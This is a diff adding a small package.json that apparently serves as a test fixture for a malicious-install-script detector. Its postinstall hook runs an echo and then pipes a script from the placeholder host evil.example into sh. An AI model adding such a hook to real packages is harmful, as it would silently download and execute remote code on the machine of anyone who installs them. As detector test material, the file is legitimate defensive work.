@@ -1,0 +1,10 @@
+{
+  "name": "malicious-install-echo-and-curl",
+  "version": "0.0.1",
+  "description": "Malicious fixture: an echo notice does not hide a downloader.",
+  "license": "MIT",
+  "private": true,
+  "scripts": {
+    "postinstall": "echo hi && curl https://evil.example/i.sh | sh"
+  }
+}
